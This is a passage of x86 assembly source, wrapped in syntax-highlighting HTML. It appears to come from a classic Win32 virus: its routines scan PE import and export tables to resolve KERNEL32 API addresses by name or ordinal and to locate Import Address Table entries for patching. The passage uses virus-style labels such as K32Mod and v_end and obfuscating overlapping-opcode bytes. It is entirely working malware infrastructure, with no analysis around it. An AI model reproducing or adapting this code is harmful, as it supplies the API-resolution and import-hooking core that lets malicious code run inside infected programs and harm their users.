                                                </span><span class="sc1">;from Arg2</span><span class="sc0">
</span><span class="sc5">Next_char_from_DLL</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;do a char by char comparison with module name found</span><span class="sc0">
                        </span><span class="sc1">;inside section. Stop when a NULL or a dot is found</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">IT_nup</span><span class="sc0">          </span><span class="sc1">;its a dot</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc12">'.'</span><span class="sc4">+</span><span class="sc12">'a'</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc4">-</span><span class="sc12">'a'</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">no_up</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">20h</span><span class="sc0">         </span><span class="sc1">;convert to upercase</span><span class="sc0">
</span><span class="sc5">no_up</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc12">'a'</span><span class="sc0">
</span><span class="sc5">IT_nup</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Get_DLL_Name</span><span class="sc0">    </span><span class="sc1">;names dont match, get next import descriptor</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Next_char_from_DLL</span><span class="sc0">

</span><span class="sc5">Found_DLL_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;we got the import descriptor containin specified module name</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esi.ID_ForwarderChain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;store ptr to ForwarderChain for l8r</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.Pushad_esi</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">    </span><span class="sc1">;store ptr to imp.descriptor for l8r</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad.Arg3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Pushad_ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32Mod</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcAddressET</span><span class="sc0">        </span><span class="sc1">;scan exp.table of spec.module handle</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;and get function adress of spec.API</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.ID_FirstThunk</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;This is needed just in case the</span><span class="sc0">
                                             </span><span class="sc1">;API function adressez are bound</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">    </span><span class="sc1">;if not found then go, this value cant</span><span class="sc0">
                                        </span><span class="sc1">;be zero or the IAT wont be patched</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcAddrIAT</span><span class="sc0">          </span><span class="sc1">;inspect first thunk (which later will</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;be patched by the loader)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IAT_found</span><span class="sc0">               </span><span class="sc1">;if found then jump (save it and go)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.ID_OriginalFirstThunk</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get original thunk</span><span class="sc0">
                                        </span><span class="sc1">;(which later will hold the original</span><span class="sc0">
                                        </span><span class="sc1">;unpatched IAT)</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">    </span><span class="sc1">;if not found then go, this value</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;could be zero</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcAddrIAT</span><span class="sc0">          </span><span class="sc1">;inspect original thunk</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">IAT_found</span><span class="sc0">               </span><span class="sc1">;jump if not found</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;we got the pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.ID_FirstThunk</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;convert it to RVA</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6Bh</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">    </span><span class="sc1">;imul   esi,[ebx],-0C0h ;bizarre! but no jump</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                   </span><span class="sc1">;necesary!</span><span class="sc0">

</span><span class="sc5">End_GetProcAddressIT</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0"> </span><span class="sc1">;xor eax,eax   ;error, adress not found</span><span class="sc0">

</span><span class="sc5">IAT_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;save IAT entry pointer</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">                </span><span class="sc1">;go and unwind parameterz in stack</span><span class="sc0">

</span><span class="sc5">GetProcAddrIAT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;this function scans the IMAGE_THUNK_DATA array of "dwords"</span><span class="sc0">
                </span><span class="sc1">;  from the selected IMAGE_IMPORT_DESCRIPTOR, searchin for</span><span class="sc0">
                </span><span class="sc1">;  the selected API name. This function works for both</span><span class="sc0">
                </span><span class="sc1">;  bound and unbound import descriptorz. This function is</span><span class="sc0">
                </span><span class="sc1">;  called from inside GetProcAddressIT.</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  EBX = RAW start pointer of import section</span><span class="sc0">
                </span><span class="sc1">;  ECX = RVA pointer to IMAGE_THUNK_ARRAY</span><span class="sc0">
                </span><span class="sc1">;  EDX = RVA start pointer of import section</span><span class="sc0">
                </span><span class="sc1">;  EDI = pointer selected API function name.</span><span class="sc0">
                </span><span class="sc1">;  EBP = RAW size of import section</span><span class="sc0">
                </span><span class="sc1">;  TOS+04h (Arg1): real address of API function inside selected</span><span class="sc0">
                </span><span class="sc1">;                  module (in case the descriptor is unbound).</span><span class="sc0">
                </span><span class="sc1">;  TOS+00h (return adress)</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  EAX = RVA pointer to IAT entry</span><span class="sc0">
                </span><span class="sc1">;  EAX = 0, if not found</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">IT_not_found</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get RAW pointer to IMAGE_THUNK_DATA array</span><span class="sc0">

</span><span class="sc5">next_thunk_dword</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;get dword value</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;end of IMAGE_THUNK_DATA array?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">IT_not_found</span><span class="sc0">

</span><span class="sc5">no_ordinal</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;convert dword to a RAW pointer</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;dword belongs to an unbound image descriptor?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">IT_search</span><span class="sc0">       </span><span class="sc1">;no, jump</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;we have the API adress, reconvert to RVA</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Arg1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;API adressez match?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">IT_found?</span><span class="sc0">               </span><span class="sc1">;yea, we found it, jump</span><span class="sc0">

</span><span class="sc5">IT_search</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;image descr.contains imports by name</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">eax.IBN_Name</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get API name from import descriptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Arg3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get API name selected as a</span><span class="sc0">
                                                </span><span class="sc1">;parameter</span><span class="sc0">
</span><span class="sc5">IT_next_char</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc1">;find req.API from all imported API namez</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">;do APIz match?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IT_new_search</span><span class="sc0">   </span><span class="sc1">;no, continue searchin</span><span class="sc0">

</span><span class="sc5">IT_Matched_char</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IT_next_char</span><span class="sc0">

</span><span class="sc5">IT_new_search</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;yea, they match, we found it</span><span class="sc0">
        
</span><span class="sc5">IT_found?</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">next_thunk_dword</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get the pointer to the new IAT entry</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;convert it to RVA</span><span class="sc0">

</span><span class="sc5">IT_not_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">GetProcAddressIT</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetProcAddressET</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc1">;This function is similar to GetProcAddressIT except</span><span class="sc0">
                      </span><span class="sc1">;  that it looks for API functions in the export table</span><span class="sc0">
                      </span><span class="sc1">;  of a given DLL module. It has the same functionality</span><span class="sc0">
                      </span><span class="sc1">;  as the original GetProcAddress API exported from</span><span class="sc0">
                      </span><span class="sc1">;  KERNEL32 except that it is able to find API</span><span class="sc0">
                      </span><span class="sc1">;  functions exported by ordinal from KERNEL32.</span><span class="sc0">
                      </span><span class="sc1">;on entry:</span><span class="sc0">
                      </span><span class="sc1">;  TOS+08h (Arg2): pszAPIname (pointer to API name)</span><span class="sc0">
                      </span><span class="sc1">;  TOS+04h (Arg1): module handle/base address of module</span><span class="sc0">
                      </span><span class="sc1">;  TOS+00h (return adress)</span><span class="sc0">
                      </span><span class="sc1">;on exit:</span><span class="sc0">
                      </span><span class="sc1">;  ECX = API function address</span><span class="sc0">
                      </span><span class="sc1">;  ECX = 0, if not found</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.cPushad.Arg1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get Module Handle from Arg1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get address of PE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">eax.NT_OptionalHeader</span><span class="sc0">    \ </span><span class="sc1">;get size of Export directory</span><span class="sc0">
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">  \
                        </span><span class="sc5">.DE_Export</span><span class="sc0">            \
                        </span><span class="sc5">.DD_Size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">  </span><span class="sc1">;size is zero, No API exported !</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                       </span><span class="sc1">;get address of Export directory</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">eax.NT_OptionalHeader</span><span class="sc0">    \
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">  \
                        </span><span class="sc5">.DE_Export</span><span class="sc0">            \
                        </span><span class="sc5">.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">ifndef</span><span class="sc0">  </span><span class="sc5">NoOrdinal</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.cPushad.Arg2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get address of requested API name or</span><span class="sc0">
                                        </span><span class="sc1">;ordinal value from Arg2</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">10000h</span><span class="sc0">             </span><span class="sc1">;check if Arg2 is an ordinal</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Its_API_ordinal</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc5">Its_API_name</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;get address of exported API names</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebp.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebp.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get number of exported API names</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">Search_for_API_name</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;get address of next exported API name</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esp.Pshd.cPushad.Arg2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get address of requested API name</span><span class="sc0">
                                            </span><span class="sc1">;from Arg2</span><span class="sc0">
</span><span class="sc5">Next_Char_in_API_name</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmpsb</span><span class="sc0">                               </span><span class="sc1">;find requested API from all</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Matched_char_in_API_name</span><span class="sc0">    </span><span class="sc1">;exported API namez</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Search_for_API_name</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">Proc_Address_not_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">;API not found</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">End_GetProcAddressET</span><span class="sc0">
                
</span><span class="sc9">ifndef</span><span class="sc0">  </span><span class="sc5">NoOrdinal</span><span class="sc0">

</span><span class="sc5">Its_API_ordinal</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebp.ED_BaseOrdinal</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;normalize Ordinal, i.e.</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Check_Index</span><span class="sc0">               </span><span class="sc1">;convert it to an index</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc5">Matched_char_in_API_name</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;end of API name reached?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Next_Char_in_API_name</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">;get address of exp.API ordinals</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebp.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get index into exp.API functions</span><span class="sc0">

</span><span class="sc5">Check_Index</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebp.ED_NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;check for out of range index</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;get address of exported API functions</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebp.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get address of requested API function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;take care of forwarded API functions</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">

</span><span class="sc5">End_GetProcAddressET</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;set requested Proc Address, if found</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">GetProcAddressET</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">MyGetProcAddressK32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;this function is simply a wraper to the GetProcAddress</span><span class="sc0">
                      </span><span class="sc1">;  API. It retrieves the address of an API function</span><span class="sc0">
                      </span><span class="sc1">;  exported from KERNEL32.</span><span class="sc0">
                      </span><span class="sc1">;on entry:</span><span class="sc0">
                      </span><span class="sc1">;  TOS+04h (Arg1): pszAPIname (pointer to API name)</span><span class="sc0">
                      </span><span class="sc1">;  TOS+00h (return adress)</span><span class="sc0">
                      </span><span class="sc1">;on exit:</span><span class="sc0">
                      </span><span class="sc1">;  ECX = API function address</span><span class="sc0">
                      </span><span class="sc1">;  ECX = 0, if not found</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32Mod</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;KERNEL32 module handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">MyGetProcAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

